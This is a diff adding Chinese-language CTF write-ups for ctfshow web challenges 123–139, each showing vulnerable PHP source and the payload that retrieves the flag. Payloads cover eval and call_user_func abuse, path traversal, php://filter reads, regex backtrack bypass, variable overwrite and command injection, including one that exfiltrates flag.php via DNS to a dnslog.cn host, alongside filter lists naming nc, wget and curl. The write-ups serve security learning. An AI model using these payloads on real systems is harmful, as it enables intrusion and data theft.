@@ -1,4 +1,4 @@
-# CTFSHOW-WEB入门
+CTFSHOW-WEB入门
 
 ## 一、信息收集
 
@@ -4870,3 +4870,703 @@ payload
 得到flag
 
 ![image-20240512140557554](image/image-20240512140557554.png)
+
+---
+
+### web123
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
+         eval("$c".";");  
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+} 
+
+```
+
+eval()函数会执行`$c`
+
+$c和if判断需要的两个post
+
+ 在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，所以按理来说我们构造不出`CTF_SHOW.COM`这个变量(因为含有`.`)
+
+php中有个特性就是如果传入`[`，它被转化为`_`之后，后面的字符就会被保留下来不会被替换
+
+payload
+
+```
+post：
+CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
+```
+
+---
+
+### web125
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
+         eval("$c".";");
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+}
+
+```
+
+过滤了flag和echo关键字，
+
+可以用highlight_file来显示文件，
+
+flag在post中被🈲了，我们通过get来传参
+
+**payload**
+
+```
+get：
+?1=flag.php
+
+post：
+CTF_SHOW=1&CTF[SHOW.COM=1&fun=highlight_file($_GET[1])
+```
+
+得到flag
+
+![image-20240519114816549](image/image-20240519114816549.png)
+
+---
+
+### web126
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+$a=$_SERVER['argv'];
+$c=$_POST['fun'];
+if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
+         eval("$c".";");  
+         if($fl0g==="flag_give_me"){
+             echo $flag;
+         }
+    }
+} 
+
+```
+
+这次正则匹配了一些关键字母
+
+`$_SERVER['argv']`
+
+```
+`$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`
+ query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web application的数据
+```
+
+所以如果我们get传入变量赋值语句，接着在post里面来执行这个赋值语句就可以完美绕过
+
+payload
+
+```
+?$fl0g=flag_give_me;
+
+post：
+CTF_SHOW=1&CTF[SHOW.COM=1&fun=eval($a[0])
+```
+
+得到flag
+
+![image-20240519115646018](image/image-20240519115646018.png)
+
+---
+
+### web127
+
+```php
+ <?php
+error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+$ctf_show = md5($flag);
+$url = $_SERVER['QUERY_STRING'];
+//特殊字符检测
+function waf($url){
+    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
+        return true;
+    }else{
+        return false;
+    }
+}
+if(waf($url)){
+    die("嗯哼？");
+}else{
+    extract($_GET);
+}
+if($ctf_show==='ilove36d'){
+    echo $flag;
+} 
+
+```
+
+这里开启了`$_SERVER['QUERY_STRING']`，这里用了一个extract()函数
+
+**extract()** 函数从数组中将变量导入到当前的符号表，使用数组键名作为变量名，使用数组键值作为变量值
+
+![image-20240519120208605](image/image-20240519120208605.png)
+
+举例就是`?a=2`，就会变成`$a=2`，这里`ctf_show`有个`_`需要构造，前面说过php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有`空格、+、[`则会被转化为`_`，这里空格没有被🈲，使用空格
+
+payload
+
+```
+?ctf show=ilove36d
+```
+
+得到flag
+
+![image-20240519120402124](image/image-20240519120402124.png)
+
+---
+
+### web128
+
+```php
+<?php
+error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+
+$f1 = $_GET['f1'];
+$f2 = $_GET['f2'];
+
+if(check($f1)){
+    var_dump(call_user_func(call_user_func($f1,$f2)));
+}else{
+    echo "嗯哼？";
+}
+function check($str){
+    return !preg_match('/[0-9]|[a-z]/i', $str);
+} 
+
+```
+
+还是这个函数`call_user_func`
+
+![image-20240519120623158](image/image-20240519120623158.png)
+
+**call_user_func()** 函数把第一个参数作为回调函数，其余参数都是回调函数的参数
+
+这里对`$f1`进行了正则过滤，不能为数字和字母，这里可以使用gettext拓展，
+
+`_() 等效于 gettext()`
+
+```
+php
+<?php
+echo gettext("1");
+//输出结果：1
+
+echo _("1");
+//输出结果：1
+```
+
+因此`call_user_func('_','ctfshownb')` 返回的结果为ctfshownb，接下来到第二层`call_user_func`，找了一圈发现`get_defined_vars`函数可以使用
+
+**get_defined_vars ( void ) : array** 函数**返回一个包含所有已定义变量列表的多维数组**，这些变量包括环境变量、服务器变量和用户定义的变量。
+
+![image-20240519120956058](image/image-20240519120956058.png)
+
+构建payload
+
+```
+?f1=_&f2=get_defined_vars
+```
+
+得到flag
+
+![image-20240519122217569](image/image-20240519122217569.png)
+
+---
+
+### web129
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['f'])){
+    $f = $_GET['f'];
+    if(stripos($f, 'ctfshow')>0){
+        echo readfile($f);
+    }
+} 
+
+```
+
+![image-20240519124445621](image/image-20240519124445621.png)
+
+#### 一、直接文件包含
+
+payload
+
+```
+?f=/ctfshow/../../../../../../../../../var/www/html/flag.php
+```
+
+得到flag
+
+![image-20240519122520791](image/image-20240519122520791.png)
+
+####  二、使用php伪协议读取
+
+```
+?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
+```
+
+得到flag
+
+![image-20240519123955182](image/image-20240519123955182.png)
+
+---
+
+---
+
+### web130
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = $_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f, 'ctfshow') === FALSE){
+        die('bye!!');
+    }
+    echo $flag;
+} 
+
+```
+
+这题直接就ctfshow就过了，因为正则模式匹配不到，然后`stripos()`搜索字符串返回的值是0(因为ctfshow第一次出现的位置就是0下标)也跳过了if里的语句直接输出flag，所以payload为
+
+```
+post:
+f=ctfshow
+```
+
+PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit
+ 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false
+
+写一个脚本来发包
+
+```python
+import requests
+url = "https://15c8cfe4-4667-4877-bb83-e106c5352578.challenge.ctf.show/"
+data = {
+    'f': '12345'*200000+'ctfshow'
+}
+res = requests.post(url=url,data=data)
+print(res.text)
+
+```
+
+得到flag
+
+![image-20240519125712201](image/image-20240519125712201.png)
+
+---
+
+### web131
+
+```php
+php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = (String)$_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f,'36Dctfshow') === FALSE){
+        die('bye!!');
+    }
+    echo $flag;
+} 
+```
+
+这次加了string函数，用上题脚本改一下就可以，一样利用正则的回溯次数
+
+```python
+import requests
+url = "https://a05eda50-8fbd-42d3-9b41-9814aeb04207.challenge.ctf.show/"
+data = {
+    'f': '12345'*200000+'36Dctfshow'
+}
+res = requests.post(url=url,data=data)
+print(res.text)
+```
+
+得到flag
+
+![image-20240519125946797](image/image-20240519125946797.png)
+
+---
+
+### web132
+
+![image-20240519130138536](image/image-20240519130138536.png)
+
+在robots.txt里看到提示admin
+
+![image-20240519130305652](image/image-20240519130305652.png)
+
+访问得到源码
+
+```php
+<?php
+include("flag.php");
+highlight_file(__FILE__);
+if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
+    $username = (String)$_GET['username'];
+    $password = (String)$_GET['password'];
+    $code = (String)$_GET['code'];
+    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
+        
+        if($code == 'admin'){
+            echo $flag;
+        }
+    }
+} 
+```
+
+三个get参数，并且有个if判断条件；php运算符优先级 `||`优先级低于`&&`
+
+所以我们只需要满足`username=admin`过第一个if条件，`code=admin`满足第二个if条件即可，payload为
+
+```
+?username=admin&code=admin&password=1
+```
+
+得到flag
+
+![image-20240519130646797](image/image-20240519130646797.png)
+
+---
+
+### web133
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("6个字母都还不够呀?!");
+    }
+} 
+
+```
+
+限制了一些命令执行语句并且还限制了6个字符
+
+需要利用dns外带数据回来，利用网站http://www.dnslog.cn/
+
+先拿到一个二级dns域名
+
+tmq9jr.dnslog.cn
+
+因为限制了6个字符
+
+所以先执行$F
+
+```
+eval(substr($F,0,6)); 
+截取执行$F的前六个字符。但是$F的值不变
+```
+
+所以构建一个
+
+```
+F=`$F`;
+```
+
+然后在后面拼接命令，将命令回显带到二级域名上
+
+```
+ping `cat flag.php | grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.tmq9jr.dnslog.cn -c 1
+```
+
+看一下[ping命令](https://blog.csdn.net/qq_44159028/article/details/118152928)
+
+![image-20240519141103163](image/image-20240519141103163.png)
+
+因为二级域名带出的信息有限，所以要对带会的信息进行筛选，利用grep命令以及[tr命令](https://www.runoob.com/linux/linux-comm-tr.html)
+
+构建payload
+
+```
+?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd "[a-z]"/"[0-9]"`.tmq9jr.dnslog.cn -c 1
+```
+
+得到flag
+
+![image-20240519135735706](image/image-20240519135735706.png)
+
+---
+
+### web134
+
+```php
+<?php
+highlight_file(__FILE__);
+$key1 = 0;
+$key2 = 0;
+if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
+    die("nonononono");
+}
+@parse_str($_SERVER['QUERY_STRING']);
+extract($_POST);
+if($key1 == '36d' && $key2 == '36d') {
+    die(file_get_contents('flag.php'));
+} 
+
+```
+
+`parse_str()`函数和`extract()`函数，得出是变量覆盖
+
+如果我们传入?_POST[a]=freedom
+
+就会输出`array(1) { ["a"]=> string(6) "freedom" }`
+
+再使用extract函数，就会变成`$a=freedom`
+
+payload
+
+```
+?_POST[key1]=36d&_POST[key2]=36d
+```
+
+得到flag
+
+![image-20240519142744541](image/image-20240519142744541.png)
+
+---
+
+### web135
+
+```php
+?php
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+  if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("师傅们居然破解了前面的，那就来一个加强版吧");
+    }
+} 
+
+```
+
+在web133基础上多🈲了很多函数，cp复制到能访问的文本就可以
+
+payload
+
+```
+?F=`$F `;cp flag.php flag.txt
+```
+
+然后访问flag.txt
+
+得到flag
+
+![image-20240519143132328](image/image-20240519143132328.png)
+
+---
+
+### web136
+
+```php
+ <?php
+error_reporting(0);
+function check($x){
+    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    check($c);
+    exec($c);
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+```
+
+这里ban了大量函数和字符，不过在linux下还有一个命令tee
+
+Linux tee命令用于读取标准输入的数据，并将其内容输出成文件
+
+```
+ 用法:
+ tee file1 file2 //复制文件
+ ls|tee 1.txt //命令输出到1.txt文件中
+```
+
+
+
+首先查看一下根目录文件
+
+```
+?c=ls /|tee ls
+```
+
+接着访问ls进行下载
+
+![image-20240519143746876](image/image-20240519143746876.png)
+
+得到文件名称
+
+然后将f149_15_h3r3 tee到flag
+
+```
+?c=cat /f149_15_h3r3|tee flag
+```
+
+访问flag得到flag
+
+![image-20240519143958852](image/image-20240519143958852.png)
+
+---
+
+### web137
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+class ctfshow
+{
+    function __wakeup(){
+        die("private class");
+    }
+    static function getFlag(){
+        echo file_get_contents("flag.php");
+    }
+}
+call_user_func($_POST['ctfshow']); 
+
+```
+
+直接调用ctfshow类中的getFlag方法，这里利用[::](https://blog.csdn.net/niedongri/article/details/78653373)
+
+payload
+
+```
+post:
+ctfshow=ctfshow::getFlag
+```
+
+得到flag
+
+![image-20240519144540420](image/image-20240519144540420.png)
+
+---
+
+### web138
+
+```php
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+class ctfshow
+{
+    function __wakeup(){
+        die("private class");
+    }
+    static function getFlag(){
+        echo file_get_contents("flag.php");
+    }
+}
+if(strripos($_POST['ctfshow'], ":")>-1){
+    die("private function");
+}
+call_user_func($_POST['ctfshow']); 
+
+```
+
+在前一题基础上把冒号给ban了，但`call_user_func`支持传入数组形式
+
+```
+call_user_func(array($ctfshow, ‘getFlag’));
+这时候会调用ctfshow中的getFlag方法
+```
+
+payload
+
+```
+ctfshow[0]=ctfshow&ctfshow[1]=getFlag
+```
+
+得到flag
+
+![image-20240519144859153](image/image-20240519144859153.png)
+
+---
+
+### web139
+
+```php
+<?php
+error_reporting(0);
+function check($x){
+    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    check($c);
+    exec($c);
+}
+else{
+    highlight_file(__FILE__);
+}
+?> 
+
+```
+
+进行盲注
+
